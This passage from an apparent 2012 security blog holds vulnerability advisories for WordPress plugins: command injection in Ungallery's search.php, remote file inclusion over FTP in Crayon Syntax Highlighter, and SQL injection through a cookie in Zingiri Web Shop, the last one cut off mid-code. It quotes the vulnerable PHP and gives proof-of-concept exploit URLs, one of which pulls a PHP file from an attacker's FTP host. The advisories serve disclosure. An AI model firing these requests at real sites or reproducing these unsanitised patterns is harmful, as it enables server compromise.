		<h2 class="entry-title"><a href="http://ceriksen.com/2012/10/23/wordpress-ungallery-remote-command-injection-vulnerability/" title="Permalink to WordPress Ungallery remote command injection vulnerability" rel="bookmark">WordPress Ungallery remote command injection vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Analysis of vulnerability</strong></p>
<p>The Ungallery for WordPress offers functionality for searching for pictures in a gallery, which is implemented through the plain filesystem in <a href="http://plugins.svn.wordpress.org/ungallery/tags/2.1.4/search.php">search.php</a>.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a66437103258645" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$gallerylink = ($_GET['gallerylink']) ;
$search = ($_GET['search']) ;
$dir = $pic_root . $gallerylink;

//	Find galleries
print "Searching in &lt;i&gt;$dir.&lt;/i&gt;
&lt;br /&gt;
&lt;br /&gt;";

print "These galleries matched &lt;i&gt;$search:&lt;/i&gt;&lt;br /&gt;";
$galleries = `find $dir -iname \*$search\* -type d`;

$galleries = explode("\n", $galleries);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a66437103258645-18">18</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a66437103258645-19">19</div><div class="crayon-num" data-line="crayon-53c9878a66437103258645-20">20</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a66437103258645-21">21</div><div class="crayon-num" data-line="crayon-53c9878a66437103258645-22">22</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a66437103258645-23">23</div><div class="crayon-num" data-line="crayon-53c9878a66437103258645-24">24</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a66437103258645-25">25</div><div class="crayon-num" data-line="crayon-53c9878a66437103258645-26">26</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a66437103258645-27">27</div><div class="crayon-num" data-line="crayon-53c9878a66437103258645-28">28</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a66437103258645-29">29</div><div class="crayon-num" data-line="crayon-53c9878a66437103258645-30">30</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a66437103258645-18"><span class="crayon-sy">$</span><span class="crayon-v">gallerylink</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'gallerylink'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a66437103258645-19"><span class="crayon-sy">$</span><span class="crayon-v">search</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'search'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a66437103258645-20"><span class="crayon-sy">$</span><span class="crayon-v">dir</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">pic_root</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">gallerylink</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a66437103258645-21">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a66437103258645-22"><span class="crayon-c">//&nbsp;&nbsp;&nbsp;&nbsp;Find galleries</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a66437103258645-23"><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"Searching in &lt;i&gt;$dir.&lt;/i&gt;</span></div><div class="crayon-line" id="crayon-53c9878a66437103258645-24"><span class="crayon-s">&lt;br /&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a66437103258645-25"><span class="crayon-s">&lt;br /&gt;"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a66437103258645-26">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a66437103258645-27"><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"These galleries matched &lt;i&gt;$search:&lt;/i&gt;&lt;br /&gt;"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a66437103258645-28"><span class="crayon-sy">$</span><span class="crayon-v">galleries</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">`</span><span class="crayon-i">find</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">dir</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">iname</span><span class="crayon-h"> </span><span class="crayon-sy">\</span><span class="crayon-o">*</span><span class="crayon-sy">$</span><span class="crayon-i">search</span><span class="crayon-sy">\</span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">type</span><span class="crayon-h"> </span><span class="crayon-i">d</span><span class="crayon-sy">`</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a66437103258645-29">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a66437103258645-30"><span class="crayon-sy">$</span><span class="crayon-v">galleries</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">"\n"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">galleries</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0035 seconds] -->
<p>Note that the <a href="http://php.net/manual/en/language.operators.execution.php">backtick character</a> in PHP has a special meaning, as opposed to the &#8221; and &#8216;. When you wrap something in 2 <a href="http://php.net/manual/en/language.operators.execution.php">backtick characters</a>, it will act as if the contents between them is passed to shell_exec. Note however that the $search variable, which is extracted from the search GET variable, is never sanitized before passed into the exec on line 28. This means that we can pull off a remote command injection with a simple request like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a66447024042916" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/?x=x&amp;search=x | dir</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a66447024042916-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a66447024042916-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/?x=x&amp;search=x | dir</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/command-injection/" rel="tag">Command Injection</a>, <a href="http://ceriksen.com/tag/ungallery/" rel="tag">Ungallery</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/10/23/wordpress-ungallery-remote-command-injection-vulnerability/#respond" title="Comment on WordPress Ungallery remote command injection vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-176 -->

				
					
<article id="post-139" class="post-139 post type-post status-publish format-standard hentry category-advisories tag-crayon-syntax-highlighter tag-rfi tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/10/15/wordpress-crayon-syntax-highlighter-remote-file-inclusion-vulnerability/" title="1:14 pm" rel="bookmark" class="entry-date"><time datetime="2012-10-15T13:14:46+00:00" pubdate>October 15, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/10/15/wordpress-crayon-syntax-highlighter-remote-file-inclusion-vulnerability/" title="Permalink to WordPress Crayon Syntax Highlighter remote file inclusion vulnerability" rel="bookmark">WordPress Crayon Syntax Highlighter remote file inclusion vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href=" http://secunia.com/advisories/50804">Secunia advisory SA 50804</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The Crayon Syntax highlighter implements a vulnerable RPC-like system for AJAX in <a href="http://plugins.svn.wordpress.org/crayon-syntax-highlighter/trunk/util/ajax.php">/util/ajax.php</a> and <a href="http://plugins.svn.wordpress.org/crayon-syntax-highlighter/trunk/util/preview.php">/util/preview.php</a>. Both files share these 3 lines of code as being the first ones in both:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a66936986570102" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
require_once('../crayon_wp.class.php');
crayon_die_if_not_php($_GET['wp_load'], 'wp-load');
require_once($_GET['wp_load']);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a66936986570102-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a66936986570102-2">2</div><div class="crayon-num" data-line="crayon-53c9878a66936986570102-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a66936986570102-1"><span class="crayon-k ">require_once</span><span class="crayon-sy">(</span><span class="crayon-s">'../crayon_wp.class.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a66936986570102-2"><span class="crayon-e">crayon_die_if_not_php</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'wp_load'</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'wp-load'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a66936986570102-3"><span class="crayon-k ">require_once</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'wp_load'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0014 seconds] -->
<p>So it apperas that at least it attempts to do some validation. Let us see how that is implemented in global.php(Included by crayon_wp.class.php):</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a66944655440679" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Checks if the input is a valid PHP file and matches the $valid filename
function crayon_is_php_file($filepath, $valid) {
	$path_wp_load = pathinfo($filepath);
	return is_file($filepath) &amp;&amp; $path_wp_load['extension'] === 'php' &amp;&amp; $path_wp_load['filename'] === $valid;
}

// Stops the script if crayon_is_php_file() returns false
function crayon_die_if_not_php($filepath, $valid) {
	if (!crayon_is_php_file($filepath, $valid)) {
		die("Incorrect arguments for '$valid'");
	}
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a66944655440679-187">187</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a66944655440679-188">188</div><div class="crayon-num" data-line="crayon-53c9878a66944655440679-189">189</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a66944655440679-190">190</div><div class="crayon-num" data-line="crayon-53c9878a66944655440679-191">191</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a66944655440679-192">192</div><div class="crayon-num" data-line="crayon-53c9878a66944655440679-193">193</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a66944655440679-194">194</div><div class="crayon-num" data-line="crayon-53c9878a66944655440679-195">195</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a66944655440679-196">196</div><div class="crayon-num" data-line="crayon-53c9878a66944655440679-197">197</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a66944655440679-198">198</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a66944655440679-187"><span class="crayon-c">// Checks if the input is a valid PHP file and matches the $valid filename</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a66944655440679-188"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">crayon_is_php_file</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$valid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a66944655440679-189"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$path_wp_load</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">pathinfo</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a66944655440679-190"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-e">is_file</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">$path_wp_load</span><span class="crayon-sy">[</span><span class="crayon-s">'extension'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">===</span><span class="crayon-h"> </span><span class="crayon-s">'php'</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">$path_wp_load</span><span class="crayon-sy">[</span><span class="crayon-s">'filename'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">===</span><span class="crayon-h"> </span><span class="crayon-v">$valid</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a66944655440679-191"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a66944655440679-192">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a66944655440679-193"><span class="crayon-c">// Stops the script if crayon_is_php_file() returns false</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a66944655440679-194"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">crayon_die_if_not_php</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$valid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a66944655440679-195"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">crayon_is_php_file</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$valid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a66944655440679-196"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">die</span><span class="crayon-sy">(</span><span class="crayon-s">"Incorrect arguments for '$valid'"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a66944655440679-197"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a66944655440679-198"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0043 seconds] -->
<p>So it calls crayon_is_php_file which checks if the provided path is a file, the extension is &#8220;php&#8221; and the filename is what is expected, which in this case is wp-load.php. In theory, this should be safe if we assume that is_file only returns true for local file. However due to is_file also supporting FTP, we can get it to return true for a remote file on a FTP server! This means that if the server allows url includes, we can do a remote file include from a malicious FTP server hosting a wp-load.php file through an URL like this, either through ajax.php or preview.php:</p>
<p>http://192.168.80.130/wordpress/wp-content/plugins/crayon-syntax-highlighter/util/ajax.php?wp_load=ftp://192.168.80.201/wp-load.php</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/crayon-syntax-highlighter/" rel="tag">Crayon Syntax Highlighter</a>, <a href="http://ceriksen.com/tag/rfi/" rel="tag">RFI</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/10/15/wordpress-crayon-syntax-highlighter-remote-file-inclusion-vulnerability/#comments" title="Comment on WordPress Crayon Syntax Highlighter remote file inclusion vulnerability">1 Comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-139 -->

				
					
<article id="post-128" class="post-128 post type-post status-publish format-standard hentry category-advisories tag-wordpress-plugin tag-zingiri-web-shop">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/08/20/wordpress-zingiri-shop-sql-injection-vulnerabilities/" title="12:36 am" rel="bookmark" class="entry-date"><time datetime="2012-08-20T00:36:24+00:00" pubdate>August 20, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/08/20/wordpress-zingiri-shop-sql-injection-vulnerabilities/" title="Permalink to WordPress Zingiri Shop SQL injection vulnerabilities" rel="bookmark">WordPress Zingiri Shop SQL injection vulnerabilities</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory<br />
</strong><a href="http://secunia.com/advisories/49398/">Secunia Advisory SA 49398</a></p>
<p><strong>Analysis of  vulnerability</strong></p>
<p>This vulnerability relies on a lack of validation in the Zingiri Web Shops IsAdmin function in <a href="http://plugins.svn.wordpress.org/zingiri-web-shop/tags/2.4.3/fws/includes/subs.inc.php">/fws/includes/subs.inc.php</a> from the fws_cust cookies. The method tries to determine if the user is an admin like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a670fc224281238" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// is the id of an admin?
Function IsAdmin() {
	Global $dbtablesprefix,$integrator;

	if ($integrator-&gt;isAdmin()) return true;
	//joomla
	if (wsCurrentCmsUserIsShopAdmin()) return true;

	if (function_exists('wsLiveIsAdmin') &amp;&amp; wsLiveIsAdmin()) return true;

	if (!isset($_COOKIE['fws_cust'])) { return false; }
	$fws_cust = explode("#", $_COOKIE['fws_cust']);
	$customerid = $fws_cust[1];
	$md5pass = $fws_cust[2];
	if (is_null($customerid)) { return false; }
	$f_query = "SELECT * FROM ".$dbtablesprefix."customer WHERE ID = " . $customerid;
	if ($f_sql = mysql_query($f_query)) {
		while ($f_row = mysql_fetch_row($f_sql)) {
			if ($f_row[13] == "ADMIN" &amp;&amp; md5($f_row[2]) == $md5pass)
			{
				if ($f_row[6] == GetUserIP()) {
					return true; }
					else {
						return false; }
			} else
			{
				return false;
			}
		}
	}
	return false;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-220">220</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-221">221</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-222">222</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-223">223</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-224">224</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-225">225</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-226">226</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-227">227</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-228">228</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-229">229</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-230">230</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-231">231</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-232">232</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-233">233</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-234">234</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-235">235</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-236">236</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-237">237</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-238">238</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-239">239</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-240">240</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-241">241</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-242">242</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-243">243</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-244">244</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a670fc224281238-245">245</div><div class="crayon-num" data-line="crayon-53c9878a670fc224281238-246">246</div><div class="crayon-num crayon-striped-num" 